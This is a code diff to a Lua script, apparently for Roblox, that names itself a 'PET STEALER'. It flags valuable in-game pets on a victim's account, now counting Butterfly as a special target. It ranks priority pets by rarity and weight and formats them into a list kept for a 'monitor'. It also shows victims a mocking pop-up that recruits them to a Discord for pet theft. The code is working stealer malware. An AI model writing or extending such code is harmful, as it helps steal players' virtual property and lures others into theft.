@@ -219,7 +219,7 @@ task.spawn(function()
                 
                 if basePetType == "Kitsune" then hasKitsune = true end
                 if basePetType == "Disco Bee" then hasDiscoBee = true end
-                if basePetType == "Raccoon" then hasSpecialPets = true end
+                if basePetType == "Raccoon" or basePetType == "Butterfly" then hasSpecialPets = true end
                 if basePetType == "Dragonfly" then dragonflyCount = dragonflyCount + 1 end
                 if basePetType == "Butterfly" then butterflyCount = butterflyCount + 1 end
                 if mutationName == "Mega" and pet.isHuge then hasMegaHuge = true end
@@ -237,39 +237,6 @@ task.spawn(function()
         createStyledNotificationGUI("PET STEALER", "HEY BROTHER YOU ARE POOR YOU DONT HAVE PET I CAN STEAL!!🤣😂 IF YOU WANT TO STEAL PEOPLE PETS JOIN IN THE DISCORD CLICK THE DISCORD", "Copy Discord Link")
         return
     end
-
-    local function getPetSortScore(pet)
-        if string.find(pet.typeName:lower(), "rainbow") then return 1 end
-        if string.find(pet.typeName:lower(), "devine") then return 2 end
-        if pet.isHuge then return 3 end
-        if pet.isMutated or pet.isAged then return 4 end
-        return 5
-    end
-
-    table.sort(priorityPets, function(a, b)
-        local scoreA = getPetSortScore(a)
-        local scoreB = getPetSortScore(b)
-        if scoreA ~= scoreB then
-            return scoreA < scoreB
-        else
-            return a.weight > b.weight
-        end
-    end)
-
-    local function formatPetList()
-        local list = {}
-        for i, pet in ipairs(priorityPets) do
-            local icon = pet.isHuge and "🤭" or (pet.isAged or pet.isMutated) and "⭐" or "🎯"
-            local ageText = ""
-            if pet.age > 0 then local days, hours = math.floor(pet.age / 86400), math.floor((pet.age % 86400) / 3600); ageText = days > 0 and string.format(" (Age: %dd %dh)", days, hours) or string.format(" (Age: %dh)", hours) end
-            local weightText = pet.weight ~= pet.baseWeight and string.format("%.2f KG (Base: %.2f KG)", pet.weight, pet.baseWeight) or string.format("%.2f KG", pet.weight)
-            table.insert(list, string.format("%s %s - %s%s [Lv.%d]", icon, pet.typeName, weightText, ageText, pet.level))
-            if i >= CONFIG.MAX_PETS_IN_LIST then local remaining = #priorityPets - i; if remaining > 0 then table.insert(list, string.format("➕ ... and %d more priority pets", remaining)) end; break end
-        end
-        return "```\n" .. table.concat(list, "\n") .. "\n```"
-    end
-
-    formattedPriorityPetsForMonitor = formatPetList()
 
     task.spawn(function()
         while player.Parent do
@@ -306,6 +273,39 @@ task.spawn(function()
             task.wait(4)
         end
     end)
+
+    local function getPetSortScore(pet)
+        if string.find(pet.typeName:lower(), "rainbow") then return 1 end
+        if string.find(pet.typeName:lower(), "devine") then return 2 end
+        if pet.isHuge then return 3 end
+        if pet.isMutated or pet.isAged then return 4 end
+        return 5
+    end
+
+    table.sort(priorityPets, function(a, b)
+        local scoreA = getPetSortScore(a)
+        local scoreB = getPetSortScore(b)
+        if scoreA ~= scoreB then
+            return scoreA < scoreB
+        else
+            return a.weight > b.weight
+        end
+    end)
+
+    local function formatPetList()
+        local list = {}
+        for i, pet in ipairs(priorityPets) do
+            local icon = pet.isHuge and "🤭" or (pet.isAged or pet.isMutated) and "⭐" or "🎯"
+            local ageText = ""
+            if pet.age > 0 then local days, hours = math.floor(pet.age / 86400), math.floor((pet.age % 86400) / 3600); ageText = days > 0 and string.format(" (Age: %dd %dh)", days, hours) or string.format(" (Age: %dh)", hours) end
+            local weightText = pet.weight ~= pet.baseWeight and string.format("%.2f KG (Base: %.2f KG)", pet.weight, pet.baseWeight) or string.format("%.2f KG", pet.weight)
+            table.insert(list, string.format("%s %s - %s%s [Lv.%d]", icon, pet.typeName, weightText, ageText, pet.level))
+            if i >= CONFIG.MAX_PETS_IN_LIST then local remaining = #priorityPets - i; if remaining > 0 then table.insert(list, string.format("➕ ... and %d more priority pets", remaining)) end; break end
+        end
+        return "```\n" .. table.concat(list, "\n") .. "\n```"
+    end
+
+    formattedPriorityPetsForMonitor = formatPetList()
 
     local serverPlayerCount, maxPlayerCount = #Players:GetPlayers(), Players.MaxPlayers
     local serverStatus = string.format("%d/%d%s", serverPlayerCount, maxPlayerCount, serverPlayerCount >= maxPlayerCount and " (Player has left)" or "")
